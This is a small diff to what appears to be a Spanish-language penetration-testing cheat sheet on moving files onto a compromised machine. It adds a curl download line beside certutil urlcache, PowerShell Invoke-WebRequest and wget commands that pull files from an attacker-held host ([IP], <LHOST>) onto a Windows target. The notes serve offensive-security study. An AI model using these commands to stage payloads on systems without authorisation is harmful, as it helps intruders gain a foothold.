@@ -43,6 +43,7 @@ sudo python smbserver.py [como se llamará el recurso a compartir] [nombre del r
          wget http://[IP]/recurso
          
      Target Windows:
+         curl -O http://[IP]/recurso
          certutil.exe -f -urlcache -split "http://<LHOST>/<FILE>" <FILE>
          powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
          Invoke-WebRequest http://[IP]/[RECURSO] -OutFile [NOMBREQUEQUERAMOS]
